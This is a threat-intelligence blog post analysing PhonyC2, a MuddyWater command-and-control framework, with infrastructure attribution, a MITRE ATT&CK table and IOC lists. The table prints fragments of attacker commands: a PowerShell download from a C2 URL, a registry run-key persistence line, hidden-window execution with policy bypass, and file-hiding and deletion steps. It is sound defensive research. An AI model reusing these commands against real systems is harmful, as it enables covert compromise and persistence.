@@ -1,0 +1,454 @@
+1/18
+www.deepinstinct.com
+/blog/phonyc2-revealing-a-new-malicious-command-control-framework-by-muddywater
+PhonyC2: Revealing a New Malicious Command & Control
+Framework by MuddyWater
+⋮ 6/29/2023
+MuddyWater, also known as Mango Sandstorm (Mercury), is a cyber espionage group that is a subordinate element
+within the Iranian Ministry of Intelligence and Security (MOIS).
+Executive summary:
+Deep Instinct’s Threat Research team has identified a new C2 (command & control) framework
+The C2 framework is custom made, continuously in development, and has been used by the MuddyWater
+group since at least 2021
+The framework is named PhonyC2 and was used in the attack on the Technion Institute
+PhonyC2 is currently used in an active PaperCut exploitation campaign by MuddyWater
+PhonyC2 is similar to MuddyC3, a previous C2 framework created by MuddyWater
+MuddyWater is continuously updating the PhonyC2 framework and changing TTPs to avoid detection, as can be seen
+throughout the blog and in the investigation of the leaked code of PhonyC2. MuddyWater uses social engineering as
+its’ primary initial access point so they can infect fully patched systems. Organizations should continue to harden
+systems and monitor for PowerShell activity.
+Background
+In April 2023, Deep Instinct’s threat research team identified three malicious PowerShell scripts that were part of an
+archive called PhonyC2_v6.zip
+Note: V6 is the name of the folder found on the server. Since this is not an official C2 framework, there is no
+changelog and version history. The framework has been changed over time, but we don't know the internal version
+numbers. Therefore, we refer to other versions by unique identifiers rather than version numbers.
+The filename piqued our interest and we set out to discover if it was a known C2 framework. After a quick
+investigation, it was revealed that the C2 framework was found by Sicehice in a server with an open directory listing.
+2/18
+Figure 1: Image of files located on the server
+Note: Sicehice is an organization that automates the collection of cyber threat intelligence from over 30 sources and
+enables users to search against the collected IPs.
+There was no previous information regarding PhonyC2 and as the zip file contained the source code, we decided to
+analyze the code to further understand this C2 framework.
+Our initial investigation revealed that the server which hosted the C2 is related to infrastructure that was used by
+MuddyWater in the attack against the Technion.
+Further research revealed additional connections to MuddyWater infrastructure including the ongoing PaperCut
+exploitation and previous attacks using earlier versions of the C2 framework.
+Exposed Server Analysis
+In addition to the zip file of the PhonyC2, Sicehice uploaded additional files found on the server, including the
+“.bash_history” file which revealed the commands the threat actors ran on the server:
+3/18
+Figure 2: Start of .bash_history file
+Figure 3: End of .bash_history file
+In figure 1 we can see the presence of “Ligolo,” another tool that is known to be used by MuddyWater.
+In figure 2, commands related to PhonyC2 are marked in red.
+In figure 2 and figure 3 marked in blue are additional IP addresses that the threat actor used. Both addresses are
+mentioned as C2 servers in the report Microsoft published about their findings from the Technion attack, which they
+attributed to MuddyWater.
+Open-source tools are marked in orange; FRP is known to be used by several Iranian threat groups and Chisel is
+only known to be used by MuddyWater, but this does not mean it’s exclusive.
+Additionally, in Figure 3, we can see another tunneling tool named “bore” that has not previously been reported to be
+in use by MuddyWater.
+The combination of the presence of known MuddyWater tools on the server and the fact that the threat actor
+communicated with two IP addresses known to be used by MuddyWater raised suspicion that PhonyC2 is a
+framework used by MuddyWater.
+Taking a Closer Look: Code Analysis
+To better understand the Phony C2 framework, we looked at the source code. As we can see in figure 2 above the
+first file of interest is “Please_Run_Once.py:”
+4/18
+Figure 4: Please_Run_Once.py code
+The script creates a unique config file where the IP address, the port that the C2 framework listens to for connections,
+and an extension for a decoy must be specified, as seen in line 5 in figure 4. Additionally, the script will add to the
+config.py file random UUIDs (Universal Unique Identifiers), which makes tracking the URLs of the C2 framework less
+trivial.
+An example of config.py file:
+Figure 5: Example of config.py with random UUID in lines 13-20
+5/18
+Figure 6: Additional information from config.py
+In figure 6 the config file contains various PowerShell commands, which are different payloads that are used by the
+framework.
+The main.py file is small and starts a multi-threaded webserver and a command line listener. From this code we see
+that the name “PhonyC2” is used internally:
+Figure 7: main.py contents
+The webserver.py is responsible for serving the C2 framework payloads:
+6/18
+Figure 8: Part of webserver.py code
+Figure 8 shows the remnants from previous iterations of the framework in the commented-out route names which
+have been replaced in this iteration of the framework with the random UUID in the config.py file (lines 13-20 in Figure
+5)
+Commandline.py receives commands from the operator and prints the output of various actions taken by the C2:
+Figure 9: Part of commandline.py
+7/18
+Figure 9 and Figure 5 the code of a file named “C:\programdata\db.sqlite” and “db.ps1.” Both of those files are
+mentioned with the same name and path in Microsoft’s report about the Technion hack.
+While the malicious files from Microsoft’s report are not publicly available for inspection, the combination of the IP
+addresses related to PhonyC2 appearing in Microsoft’s report with those file names makes a strong argument that
+the Phony C2 framework was used in the attack on the Technion. Additionally, the files created by the C2 framework
+are detected as “PowerShell/Downloader.SB,” the same detection name Microsoft used in their blog.
+Since both files are dynamically generated by the C2 framework, they are slightly different in each execution of the
+framework, therefore, blocking the hashes Microsoft provided is not exhaustive.
+How It Works
+Figure 10: PhonyC2 commands
+While it might look like there are many options and outputs, the C2 is actually simple if we understand what the code
+does.
+This C2 is a post-exploitation framework used to generate various payloads that connect back to the C2 and wait for
+instructions from the operator to conduct the final step of the “Intrusion Kill Chain.”
+"payload” Command:
+Figure 11: “payload” command output
+In figure 11 we see a step-by-step explanation of what happens:
+1. PowerShell command creates a http request to the C2 to receive an encoded file and save it as
+“c:\programdata\db.sqlite”
+2. PowerShell command writes the base64 decoded content to “c:\programdata\db.ps1”
+8/18
+Figure 12: The content of the db.ps1
+3. PowerShell command executes db.ps1 which in turn reads and decodes db.sqlite and executes the result in
+memory.
+Essentially, this is a one-liner to execute on a compromised host so it will beacon back to the C2.
+Example Decode Routine
+As previously mentioned, the files generated by the C2 are slightly different each time, however, the decoding logic
+remains mostly the same.
+Below is an example of db.sqlite content and a diagram explaining the decoding routine:
+Figure 13: HTML response from C2 server for step #1
+9/18
+Figure 14: Decode routine flow (values might change in different executions)
+“dropper” Command:
+
+This command creates different variants of PowerShell commands only for step (1).
+Figure 15: “dropper” command output
+“Ex3cut3” Command:
+
+This command creates different variants of PowerShell commands for both step (2) and (3) combined:
+Figure 16: “Ex3cut3” command output
+"list” Command:
+
+The list command shows all the connected computers to the C2 with some associated information:
+Figure 17: “list” command output
+"setcommandforall” Command:
+
+This command is the most important one, as it allows the threat actor to execute the same command on all the
+connected computers at the same time. For example, a command that will download and execute a ransomware
+payload.
+Figure 18: “setcommandforall” command output
+10/18
+"use” Command:
+This command allows the threat actor to get a PowerShell shell on a specific computer:
+Figure 19: “use” command output
+If the “use” command is selected, additional commands become available:
+Figure 20: Additional command options after selecting “use”
+"persist” and Other Commands:
+
+Most of these additional commands are self-explanatory, the only interesting one is “persist”
+Figure 21: “persist” command output
+The “persist” command is used to generate a PowerShell code to enable the operator to gain persistence on the
+infected host so it will connect back to the C2 if the infected host is restarted.
+Additionally, when the operator executes the “persist” command it writes an encrypted payload to a pre-defined
+random registry path in “HKLM\Software.” This can be partially seen in commandline.py (figure 22), as some of the
+values are stored in config.py.
+The encrypted payload is a slightly modified version of “persist_payload_2022.ps1” that triggered the entire
+investigation.
+Figure 22: Code related to persistence from commandline.py
+Below is the full chain used to achieve persistence by PhonyC2:
+By executing “persist” on a machine connected to PhonyC2 the C2 writes encrypted payload to the registry
+Add a registry key to the Windows registry that runs a script file named utils.jse located in the C:\intel\utils\
+directory at startup
+Create the directory c:\intel\utils\ if it does not exist
+Change the current directory to c:\intel\utils\
+11/18
+Decode a base64 blob and write it into utils.jse
+Figure 23: Contents of utils.jse (some values change in each execution)
+Create a registry key with random name (fmoopWgmBla) at HKLM:\\SOFTWARE\\<random> (iCXqExISMHV)
+with content similar to below:
+Figure 24: Content written to the registry with analysis comments
+When the computer is rebooted, the run key causes the execution of the utils.jse script
+The utils.jse script reads and executes the contents from the registry as seen in figure 23
+The PowerShell code in figure 25 connects to the C&C server to receive and execute a code that is similar to
+the below:
+12/18
+Figure 25: Input is base64 returned from the server
+The base64 decoded script is reading and decrypting another payload from the registry. This payload is based
+on “persist_payload_2022.ps1.”
+Infection Flow
+13/18
+Figure 26: Infection flow of PhonyC2
+Attribution
+The current version of PhonyC2 is written in Python3. It is structurally and functionally similar to MuddyC3, a previous
+MuddyWater custom C2 framework that was written in Python2.
+Figure 27: MuddyC3 output, see figure 10; similarities with PhonyC2
+14/18
+With the knowledge we gathered from investigating the source code of PhonyC2 we believe that PhonyC2 is a
+successor to MuddyC3 and POWERSTATS.
+We investigated prior MuddyWater intrusions to identify when PhonyC2 was first used and we found that on
+November 29, 2021, the IP address 87.236.212[.]22 responded with obfuscated payload which we believe is an early
+variant of Phony C2 written in Python2. For proof, we can see comments left in figure 4 by the threat actor requesting
+code changes for the script to work with Python3.
+The obfuscated payload was saved to a file named “data.sqlite” which is remarkably similar to the file name used in
+PhonyC2. In addition, the obfuscated payload has the same comma separated delimiter that is in the current
+PhonyC2 payloads, and the decoding routine is different from the most recent one.
+In figures 6 and 8 the string “apiy7” is commented out in the code. We found a submission of a URL from March 2022
+containing that string, meaning this was a PhonyC2 server, but with an earlier version than the current V6 that is
+described in this blog.
+The IP address of this URL is 137.74.131[.]30. It is mentioned in the Group-IB report as having "ETag 2aa6-
+5c939a3a79153."
+178.32.30[.]3 is another IP address that had both the “apiy7” string and "ETag 2aa6-5c939a3a79153." It is also
+referenced in a blog by Talos detailing MuddyWater activity, published in March. However, we can’t confirm if the
+activity is related to PhonyC2. The first confirmation of PhonyC2 on this server is a URL scan from August which
+contained the “apiy7” string. The same IP address had another scan in August, which revealed a custom error
+message that revealed additional PhonyC2 servers. Pivoting from those additional servers, we were able to find
+additional PhonyC2 servers with the string “apiv4” from March 2022 through May 2022 that pre-date the “apiy7”
+PhonyC2 version.
+The IP address 91.121.240[.]104 contained both “apiy7” string and "ETag 2aa6-5c939a3a79153." It was confirmed by
+Microsoft as an IP address used by MuddyWater to exploit the log4j vulnerability in the Israeli SysAid software,
+confirming that the PhonyC2 was used in those attacks as well.
+During our research we uncovered PhonyC2 servers with different ETag values or no ETag at all. We suspect that the
+occurrence of servers with same ETag value originate from duplication of the server image by the VPS provider.
+Therefore, this method might work occasionally but will be of value mostly for historical purposes.
+As we mentioned in the “Server Analysis” section, in Figure 2 and Figure 3 are two IP addresses. 194.61.121[.]86
+and 45.86.230[.]20 that were confirmed by Microsoft as MuddyWater’s C2 servers used in the Technion hack. While
+we can’t confirm whether 45.86.230[.]20 was running PhonyC2, both 46.249.35[.]243 and 194.61.121[.]86 that are
+listed in Microsoft’s report were hosting PhonyC2 V6 based on URL patterns that we have seen in the python source
+code.
+Another interesting commonality we have observed in MuddyWater’s operations is the use of “core.” In MuddyC3
+there is a directory named “core” and in PhonyC2 there is a directory called “isnotcore.” “core” is also referenced
+several times in the code (see figures 4-8). From our analysis, the PowGoop C2 servers had URL pattern of “Core?
+Token=.” We suspect that one of the servers, 164.132.237[.]79, running PowGoop, might be still controlled by
+MuddyWater. This IP is currently running Metasploit server, which MuddyWater is known to use.
+Passive DNS resolution of this IP is showing the domain 6nc110821hdb[.]co. This domain was also resolving to two
+other PowGoop servers:
+15/18
+Figure 28: Passive DNS resolution for 6nc110821hdb[.]co
+Both of those servers, 51.255.19[.]178 and 51.255.19[.]179, were hosting SimpleHelp according to Group-IB. Group-
+IB also listed many IPs from the 164.132.237.64/28 subnet as SimpleHelp servers, which makes it obvious that
+164.132.237[.]79 is somehow related to MuddyWater activity as well. The 6nc110821hdb[.]co domain name was
+looking rather suspicious and after further investigation we have found an interesting pattern:
+<3 letters><1 digit>[dot]6nc<date><optional 2 letters><optional incremented letter>[dot]co
+We detected the following domain names that still have active hosts with passive DNS resolving.
+6nc051221a[.]co
+
+6nc051221c[.]co
+6nc110821hdb[.]co
+
+6nc060821[.]co
+6nc220721[.]co
+We suspect that those domains represent infrastructure registered in 2021 by MuddyWater that are still active today.
+There are additional domains where we did not find active infrastructure, such as 6nc051221b[.]co and
+6nc110821hda[.]co. In the past, the latter was resolving to known MuddyWater infrastructure. “6nc” could be
+interpreted as C&C (Six and C), which is an abbreviation to “Command and Control.”
+At the beginning of May 2023, Microsoft’s Twitter post mentioned they had observed MuddyWater exploiting CVE-
+2023-27350 in the PaperCut print management software. While they did not share any new indicators, they noted that
+MuddyWater was “using tools from prior intrusions to connect to their C2 infrastructure” and referenced their blog on
+the Technion hack – which we already established was using PhonyC2. About the same time Sophos published
+indicators from various PaperCut intrusions they have seen. Deep Instinct found that two IP addresses from those
+intrusions are PhonyC2 servers based on URL patterns.
+1) 185.254.37[.]173
+This IP address was also hosting various payloads. While we could not retrieve most of them, we were able to
+capture the directory listing of the server in Censys.
+16/18
+Figure 29: Directory listing of 185.254.37[.]173
+The file named eh.msi was uploaded to VirusTotal. This file is an installer for the eHorus remote access tool. The
+exact same file was also mentioned by Mandiant as being used by a cluster of activity that overlaps with
+MuddyWater. Additionally, the use of eHorus software by MuddyWater was observed by Microsoft and Symantec.
+2) 45.159.248[.]244
+In this instance of PhonyC2, MuddyWater decided to use Port 53 for the server, which is normally reserved for DNS
+use. This shows yet another attempt by MuddyWater to change their TTPs and conceal their malicious activity.
+This is also the third overlap of PhonyC2 intersecting with Microsoft’s reporting on MuddyWater activity.
+Looking Ahead
+MuddyWater is continuously updating the C2 and changing TTPs to avoid detection, as can be seen throughout the
+blog, and in the investigation of the leaked code of PhonyC2.
+Deep Instinct has already observed a suspected instance of PhonyC2 that is using a newer code version than V6 that
+was leaked in a URL scan on the IP 195.20.17[.]44:
+Figure 30: URL Scan of newer than V6 PhonyC2
+17/18
+The part of the URL that is marked in red has been changed since PhonyC2 V6, the use of UUIDs has been
+changed, and the “go” extension was added. The second part of the URL in green has not been changed from the V6
+code.
+The response to this scan is the following payload.
+Figure 31: New PhonyC2 payload (see Figure 13 reference)
+While the encoded payload (green) looks similar to what we have seen in V6, MuddyWatter added a benign HTML
+code (red) to further conceal their activities. In PhonyC2 V6, the server response was solely the encoded payload
+without any HTML. Furthermore, the server’s location of the IP address 195.20.17[.]44 is in Israel, and we suspect
+this location was chosen on purpose to conceal network traffic in a targeted attacks against Israeli organizations.
+While examining the subnet 195.20.17.0/24 of this newer PhonyC2 server we have observed many IP addresses that
+are related to cybercrime. However, one of the IP addresses 195.20.17[.]183 had a passive DNS response of
+am1211.iransos[.]me. While we cannot confirm this IP address is related to MuddyWater, we suspect that the whole
+subnet is leased to some Iranian VPS provider used by MuddyWater.
+You can find the source code of PhonyC2 and the IOCs in our GitHub page.
+MITRE:
+Tactic
+Technique
+Description
+Command
+and Control
+T1071.001
+Application
+Layer
+Protocol:
+Web
+Protocols
+Phony C2 uses
+HTTP to
+download
+obfuscated
+payload
+http://46.249.35[.]243:443/9b22685e-f173-4feb-95a4-c63daaf40c58.html?X9GFTRD6OZE
+T1132.002
+Data
+Encoding:
+Non-
+Standard
+Encoding
+Phony C2
+payload is
+obfuscated
+using a custom
+encoding
+,15555554155555554,14((1414,1554(14(,1554(14(,15415554,1554(14(,1414(,154((154,15
+T1105
+Ingress
+Tool
+Transfer
+Phony C2 has
+the ability to
+download
+payloads from
+the C2 server
+http://46.249.35[.]243:443/9b22685e-f173-4feb-95a4-c63daaf40c58.html?X9GFTRD6OZE
+Persistence
+T1547.001
+Boot or
+Logon
+Autostart
+Execution:
+Registry
+Run Keys /
+Startup
+Folder
+Phony C2 has
+the ability to
+add persistence
+mechanisem
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v NEW /d C:\intel\utils\ut
+Execution
+T1059.001
+Command
+and
+Scripting
+Interpreter:
+PowerShell
+Phony C2 is
+executed by
+PowerShell and
+is executing
+PowerShell
+commands
+powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasic
+Defense
+Evasion
+T1564.001
+Hide
+Artifacts:
+Hidden
+Files and
+Directories
+Phony C2 is
+setting hidden
+attribute to files
+in
+C:\ProgramData
+attrib +h c:\programdata\db.sqlite
+T1564.003
+Hide
+Artifacts:
+Hidden
+Window
+Phony C2 is
+executed to
+hide the
+PowerShell
+window
+powershell -EP BYPASS -NoP -W 1
+18/18
+Tactic
+Technique
+Description
+T1070.004
+Indicator
+Removal:
+File
+Deletion
+Phony C2
+deletes files
+after execution
+rm c:\programdata\db.sqlite ; rm c:\programdata\db.ps1
+T1112
+Modify
+Registry
+PhonyC2
+creates registry
+entries to
+achieve
+persistence
+New-ItemProperty -Path "HKLM:SOFTWARE\iCXqExISMHV" -Name "fmoopWgmBla" -Va
+IOC:
+IP Address
+Description
+45.159.248[.]244 PhonyC2 V6 (PaperCut)
+91.121.240[.]104 "apiy7" PhonyC2 with ETag 2aa6-5c939a3a79153 (log4j)
+195.20.17[.]44
+Suspected as PhonyC2 V7
+45.86.230[.]20
+MuddyWater infrastructure related to PhonyC2 activity (DarkBit Technion)
+137.74.131[.]30
+"apiy7" PhonyC2 with ETag 2aa6-5c939a3a79153
+178.32.30[.]3
+"apiy7" PhonyC2
+137.74.131[.]24
+"apiv4" and/or "apiy7" PhonyC2 with ETag 2aa6-5c939a3a79153
+46.249.35[.]243
+PhonyC2 V6 (DarkBit Technion)
+185.254.37[.]173 PhonyC2 V6 (PaperCut)
+194.61.121[.]86
+PhonyC2 V6 (DarkBit Technion)
+87.236.212[.]22
+Suspected first version of PhonyC2
+91.235.234[.]130 PhonyC2 V6.zip
+157.90.153[.]60
+"apiv4" PhonyC2
+157.90.152[.]26
+"apiv4" PhonyC2
+65.21.183[.]238
+"apiv4" PhonyC2
+45.132.75[.]101
+Suspected MuddyWater infrastructure (edc1.6nc051221c[.]co)
+51.255.19[.]178
+Suspected MuddyWater infrastructure (pru2.6nc110821hdb[.]co)
+103.73.65[.]129
+Suspected MuddyWater infrastructure (nno1.6nc060821[.]co)
+103.73.65[.]225
+Suspected MuddyWater infrastructure (nno3.6nc060821[.]co)
+103.73.65[.]244
+Suspected MuddyWater infrastructure (kwd1.6nc220721[.]co)
+103.73.65[.]246
+Suspected MuddyWater infrastructure (kwd2.6nc220721[.]co)
+103.73.65[.]253
+Suspected MuddyWater infrastructure (kwd3.6nc220721[.]co)
+137.74.131[.]16
+Suspected MuddyWater infrastructure (qjk1.6nc051221c[.]co)
+137.74.131[.]18
+Suspected MuddyWater infrastructure (qjk2.6nc051221c[.]co)
+137.74.131[.]25
+Suspected MuddyWater infrastructure (qjk3.6nc051221c[.]co)
+164.132.237[.]67 Suspected MuddyWater infrastructure (tes2.6nc051221a[.]co)
+164.132.237[.]79 Suspected MuddyWater infrastructure (pru1.6nc110821hdb[.]co)
+Samples of files generated by the framework (those are non-exhaustive):
+SHA256
+Description
+7cb0cc6800772e240a12d1b87f9b7561412f44f01f6bb38829e84acbc8353b9c
+db.ps1
+5ca26988b37e8998e803a95e4e7e3102fed16e99353d040a5b22aa7e07438fea db.sqlite
+1c95496da95ccb39d73dbbdf9088b57347f2c91cf79271ed4fe1e5da3e0e542a
+utils.jse
+2f14ce9e4e8b1808393ad090289b5fa287269a878bbb406b6930a6c575d1f736 db.ps1
+b4b3c3ee293046e2f670026a253dc39e863037b9474774ead6757fe27b0b63c1 db.sqlite
+b38d036bbe2d902724db04123c87aeea663c8ac4c877145ce8610618d8e6571f utils.jse
+© 2023 Deep Instinct. All rights reserved.
